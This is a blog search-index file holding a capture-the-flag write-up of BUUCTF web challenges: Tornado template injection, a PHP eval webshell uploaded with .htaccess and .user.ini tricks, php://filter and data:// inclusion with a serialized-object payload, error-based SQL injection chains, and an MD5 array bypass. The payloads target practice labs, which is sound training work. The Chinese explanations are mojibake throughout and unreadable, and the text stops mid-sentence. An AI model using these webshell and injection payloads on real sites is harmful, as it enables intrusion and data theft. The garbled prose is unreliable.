<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>buuctf_web</title>
    <link href="/2023/12/20/buuctf_web/"/>
    <url>/2023/12/20/buuctf_web/</url>
    
    <content type="html"><![CDATA[<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado-1"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado-1" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado 1"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado 1</h2><p>è¿›å…¥ç­”é¢˜é¡µé¢ï¼Œå‘ç°ä¸‰ä¸ªè¶…é“¾æ¥<br>åˆ†åˆ«ç‚¹å‡»è¿›å»<br>å†ç‚¹å‡»è¿›å»åurlä¸­ä¼ è¾“äº†ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯filenameï¼Œå¦ä¸€ä¸ªæ˜¯filehashï¼Œåœ¨ç¬¬ä¸€ä¸ªflag.txtä¸­æŠŠfilenameæ”¹ä¸ºæç¤ºçš„&#x2F;fllllllllllllagè¯•è¯•<br><img src="/images/0AYQ%25Q.png"><br>æäº¤åé¡µé¢æ˜¾ç¤ºerror<br><img src="/images/0C.png"><br>çœ‹æ¥æ‹¿åˆ°flagçš„å…³é”®å°±åœ¨äºè§£å‡ºfilehashæ˜¯ä»€ä¹ˆï¼Œæ ¹æ®ç¬¬ä¸‰ä¸ªè¶…é“¾æ¥çš„æç¤ºï¼Œåº”è¯¥æ˜¯filehash&#x3D;md5(cookie_secret+md5(filename))ï¼Œfilenameç°å·²çŸ¥ï¼Œä½†cookie_secretæ˜¯ä»€ä¹ˆå‘¢ï¼Œè€Œä¸”ç¬¬äºŒä¸ªranderä¹Ÿæ²¡æœ‰ç”¨åˆ°ï¼Œä¹Ÿå¹¶ä¸æ¸…æ¥šæœ‰ä»€ä¹ˆç”¨ï¼Œåªèƒ½å»æŸ¥ä¸€ä¸‹tornadoæ¡†æ¶æœ‰ä»€ä¹ˆç‰¹ç‚¹äº†<br><a href="https://tornado-zh.readthedocs.io/zh/latest/">tornadoæ¡†æ¶çš„ä»‹ç»</a><br><img src="/images/17dc88e290814aba95813a751925fb5f.png"></p><p>æˆ‘ä»¬åœ¨è¿™ä¸ªæ–‡æ¡£é‡Œé¢å¯ä»¥çŸ¥é“cookie_secretå¹¶ä¸åƒæˆ‘ä»¬çš„cookieä¸€æ ·å¯ä»¥è‡ªå·±ä¿®æ”¹çš„(ä¸æ˜¯è‡ªå·±çš„cookie)ï¼Œè€Œæ˜¯åŒ…å«äº†æ—¶é—´æˆ³ï¼ŒHMACç­¾åå’Œç¼–ç åçš„cookieå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±ä¿®æ”¹cookieå¹¶ä¸ç°å®ã€‚<br>æƒ³åˆ°renderä¼šä¸ä¼šæ˜¯cookie_secretçš„çªç ´ç‚¹ï¼Œæ‰¾ä¸€ä¸‹renderä½œç”¨</p><p>renderæ„ä¸ºæ¸²æŸ“;self.render(â€œentry.htmlâ€,entry&#x3D;entry)è¯¥è¯­å¥æ„æ€å°±æ˜¯æ‰¾åˆ°entry.htmlè¿™ä¸ªæ¨¡æ¿ï¼Œç”¨å³è¾¹è¿™ä¸ªentryæ¥å®ä¾‹åŒ–entry.htmlæ¨¡æ¿ä¸­çš„entryå‚æ•°ï¼Œä»è€Œæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚</p><p>å›è¿‡å¤´å‘ç°flag.txté‚£ä¸ªErrorçš„é¡µé¢æœ‰ä¸€ä¸ªå‚æ•°msgä¹Ÿæ˜¯ç­‰äºError<br><img src="/images/ZMS.png"><br>å‘ç°msgå¯ä»¥å·¦å³é¡µé¢çš„è¾“å‡ºï¼Œæƒ³åˆ°ä¹‹å‰æœ‰äº›é¢˜ç›®åˆ©ç”¨ä¸€ä¸ªå‚æ•°å¯ä»¥å‡ºæ¥phpinfo()ç­‰ï¼Œå› æ­¤ç°åœ¨ç›®æ ‡å°±æ˜¯æ€ä¹ˆåˆ©ç”¨msgè¿™ä¸ªå‚æ•°æ¥æ‰¾åˆ°cookie_secretäº†<br><img src="/images/5334f6e91090438aaa0ac22c05c26768.png"><br>åœ¨æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›¸å…³renderæ¸²æŸ“çš„ä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>&#123;&#123;&#125;&#125;</code> æ¥æŠŠè¡¨è¾¾å¼ä¼ è¿›å»ä»¥è·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œè¿™æ ·æˆ‘ä»¬çŒœæƒ³<code>msg=&#123;&#123;cookieçš„ä½ç½®&#125;&#125;</code>æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„<br><img src="/images/d2702883750b44daaabc93abd5f3255a.png"><br>cookie_secretåœ¨Applicationå¯¹è±¡settingsçš„å±æ€§ä¸­ï¼Œè®¿é—®å®ƒçš„è¯å°±éœ€è¦çŸ¥é“å®ƒçš„å±æ€§åå­—ï¼Œæ ¹æ®æŸ¥é˜…å¯çŸ¥ï¼šself.application.settingsæœ‰ä¸€ä¸ªåˆ«åæ˜¯RequestHandler.settingså…¶ä¸­handleråˆæ˜¯æŒ‡å‘å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡<br>RequestHandler.settingsæŒ‡å‘self.application.settings<br>å› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settings<br><img src="/images/Q2I.png"><br>å°†handler.settingå¸¦å…¥msgå³å¯çŸ¥é“cookie_secretï¼Œå†æ¥ä¸€æ­¥æ­¥æ ¹æ®MD5æ¥è®¡ç®—filehash</p><p><img src="/images/HQC2E6.png"><br>å›åˆ°hints.txt<br>ç°åœ¨å·²ç»çŸ¥é“äº†cookie_secretçš„å€¼ï¼ŒMD5(filename)å°±æ˜¯&#x2F;fllllllllllllagçš„MD5çš„å€¼<br>&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>æŠŠcookie_secretå’ŒMD5(filename)åŠ èµ·æ¥å†è¿›è¡ŒMD5åŠ å¯†å³å¯å¾—å‡ºflag<br><img src="/images/DJ.png"></p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-1"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢-1" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ 1"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ 1</h2><p>è¿™é¢˜æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ é¢˜ï¼ŒæŒ‰ç…§è€æ–¹æ³•å…ˆä¸Šä¼ ä¸€ä¸ªæœ¨é©¬1.png å†…å®¹ï¼š<code>&lt;?php evel($_POST[&#39;a&#39;]);?&gt;</code><br>å†ä¸Šä¼ ä¸€ä¸ª.user.iniï¼šå†…å®¹ä¸º<code>auto_prepend_file=1.png</code> ä¸Šä¼ ä¹‹åä»–ä¼šç»™ä¸€ä¸ªè¿æ¥ï¼Œè¿›å…¥&#x2F;uploadä¹‹åçš„è¿æ¥ï¼Œç”¨èšå‰‘è¿æ¥ä¹Ÿä¸èƒ½æˆåŠŸè¿æ¥ï¼Œä¹Ÿå†™ä¸äº†å‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªæœ‰æ¢ä¸€ç§æ–¹æ³•äº†ã€‚</p><p>å…ˆä¸Šä¼ ä¸€ä¸ª1.pngæ–‡ä»¶<br>å†…å®¹ä¸ºï¼š<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>å†ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œ<br>å†…å®¹ä¸ºï¼š<code>SetHandler application/x-httpd-php</code></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h3><p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯ç•Œé¢ã€æ”¹å˜æ–‡ä»¶æ‹“å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½<br>è¿™é‡Œhtaccesså†…å®¹çš„æ„æ€æ˜¯è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æ</p><p>è¿™é‡Œè¦è®°å¾—æŠŠContent-Typeçš„å†…å®¹ä¿®æ”¹ä¸€ä¸‹<br><img src="/images/Y7CUL3CBL.png"><br>å¤åˆ¶&#x2F;uploadä¹‹åçš„urlå¹¶è¿›å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>:http://c59ecfdc-<span class="hljs-number">0</span>a3d-<span class="hljs-number">4</span>ed6-<span class="hljs-number">92</span>d7-<span class="hljs-number">74</span>b6bcc602d4.node4.buuoj.cn:<span class="hljs-number">81</span>/upload/<span class="hljs-number">7</span>a439cdf1a27a4860163c7641f0dc7fe/<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥postè¾“å…¥å‘½ä»¤</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>print_r(glob(<span class="hljs-string">&quot;/*&quot;</span>))<span class="hljs-comment">;</span><br><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>highlight_file(<span class="hljs-string">&quot;/flag&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä»¥è·å–flag</p><p>æˆ–ä»¥å½“å‰urlè¿æ¥ä¸­å›½èšå‰‘ï¼Œä»¥è·å–flag</p><h2 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h2><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€æ®µæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œéƒ½éœ€è¦é€šè¿‡GETæ–¹å¼ä¼ å…¥<br>issetçš„ä½œç”¨æ˜¯æ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”énull<br>file_get_contentsçš„ä½œç”¨æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²<br>è¿™é‡Œå°†textæ–‡ä»¶ä¸­è¯»å–å­—ç¬¦ä¸²ï¼Œè¿˜è¦å’Œwelcome to the zjctfç›¸ç­‰<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯data:&#x2F;&#x2F;å†™å…¥åè®®<br>payloadï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure><p><img src="/images/DKORO.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>)</span></span><br></code></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¯´æ˜fileä¸èƒ½å‡ºç°flagå­—ç¬¦<br>ä½†æ˜¯æºç æç¤ºäº†useless.phpè¿™é‡Œä½¿ç”¨phpä¼ªåè®®æ¥è¯»å–æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p><img src="/images/G3HD33.png"></p><p>ä½¿ç”¨base64è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åä¼šechoè¾“å‡ºfile<br>å°†flag.phpçš„å€¼ç»™äº†fileï¼Œç„¶åååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;flag.php&quot;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-variable">$password</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨phpç¼–è¯‘å™¨phpstorm<br><img src="/images/TMK81DK.png"><br>payload:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å³å¯çœ‹åˆ°flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL 1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL 1</h2><p>sqlæ³¨å…¥é¢˜ï¼Œå…ˆè¯•è¯•ä¸‡èƒ½å¯†ç username&#x3D;<code>1&#39; or 1=1#</code><br>password&#x3D;123<br><img src="/images/4RO.png"><br>ç»è¿‡ä¸€ç³»åˆ—å°è¯•åï¼Œå‘ç°ç©ºæ ¼ï¼Œ&#x3D;ï¼Œunionéƒ½è¢«è¿‡æ»¤äº†<br>ç©ºæ ¼è¢«è¿‡æ»¤æˆ‘ä»¬ä½¿ç”¨()æ¥ä»£æ›¿ç©ºæ ¼&#x2F;**&#x2F;è²Œä¼¼ä¹Ÿè¢«è¿‡æ»¤äº†<br>æ—¢ç„¶å¦‚æ­¤ï¼Œå°è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥<br><strong>çˆ†åº“</strong><br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=1</code></p><p><img src="/images/YKR.png"></p><p><strong>çˆ†è¡¨</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</code></p><p><img src="/images/VNTXAGU.png"></p><p><strong>çˆ†å­—æ®µ</strong><br>payload:<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#&amp;password=1</code></p><p><img src="/images/16B3IU.png"></p><p><strong>çˆ†å€¼</strong><br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br><img src="/images/M3HJZ8NQ67JFV.png"><br>å¹¶æ²¡æœ‰æˆåŠŸæ˜¾ç¤ºflagï¼Œåªæ˜¾ç¤ºäº†ä¸€åŠ~<br>ç»è¿‡æŸ¥è¯¢çŸ¥é“äº†right()å¯ä»¥æŸ¥è¯¢åé¢çš„éƒ¨åˆ†<br>payloadï¼š<code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#&amp;password=1</code><br>å’Œå‰é¢æ˜¾ç¤ºå‡ºçš„flagæ‹¼æ¥åˆ æ”¹å¾—åˆ°å®Œæ•´çš„flag</p><h2 id="MRCTF2020-Ez-bypass-1"><a href="#MRCTF2020-Ez-bypass-1" class="headerlink" title="[MRCTF2020]Ez_bypass 1"></a>[MRCTF2020]Ez_bypass 1</h2><p>ç›´æ¥ç»™å‡ºæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br>Please input first<br><br></code></pre></td></tr></table></figure><p>å‘ç°ç¬¬äº”ä¸ªifå¯ä»¥è·å¾—flag<br>å…ˆç¬¬ä¸€ä¸ªif<br><code>if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;]))</code><br>issetæ£€æŸ¥æ˜¯å¦æœ‰æ•ˆï¼Œéšä¾¿è¾“ä¸€ä¸ªå­—ç¬¦å°±èƒ½é€šè¿‡<br>ç¬¬äºŒä¸ªif<br><code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code><br>ç»•è¿‡è¿™ä¸ªifè¦å…ˆæƒ³åˆ°MD5æ¼æ´ï¼Œæˆ‘å…ˆæƒ³åˆ°çš„æ˜¯0eå¼€å¤´çš„æ¼æ´<br>ps:md5 å€¼æ˜¯ 0e å¼€å¤´ï¼Œåœ¨ php å¼±ç±»å‹æ¯”è¾ƒä¸­åˆ¤æ–­ä¸ºç›¸ç­‰<br>å†çœ‹å›æ¥ï¼Œå¼±æ¯”è¾ƒæ˜¯&#x3D;&#x3D;ï¼Œè€Œæœ¬é¢˜ä¸­æ˜¯&#x3D;&#x3D;&#x3D;å¼ºæ¯”è¾ƒï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è¿™ä¸ªç»•è¿‡<br>åœ¨æŸ¥é˜…åå‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•â€”â€”æ•°ç»„ç»•è¿‡<code>a[]=a&amp;b[]=b</code><br>è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†åˆ¤æ–­ä¸ºçœŸï¼Œåˆ¤æ–­ä¸ºnull&#x3D;&#x3D;&#x3D;null<br>è€Œä¸”id!&#x3D;gg<br>payload:<code>?gg[]=gg&amp;id[]=id</code><br><img src="/images/XNP4L0FHEL.png"><br>You got the first steponly one way to get the flag</p><p>å¾—åˆ°äº†æˆ‘ä»¬éœ€è¦çš„ç»“æœyou got the first step<br>ä½†å¤šå‡ºæ¥ä¸€å¥ only one way to get the flag<br>æŸ¥çœ‹æºä»£ç å‘ç°æ˜¯è¿™ä¸€å¥æ˜¯ç¬¬ä¸‰ä¸ªifçš„elseè¯­å¥ï¼Œè¯´æ˜ç¬¬ä¸‰ä¸ªifå¹¶æœªç»•è¿‡ï¼Œ<br><code>if(isset($_POST[&#39;passwd&#39;]))</code><br>åŒæ ·éšä¾¿postä¸€ä¸ªå­—ç¬¦å°±èƒ½ç»•è¿‡</p><p>å†çœ‹ç¬¬å››ä¸ªif<br><code>if 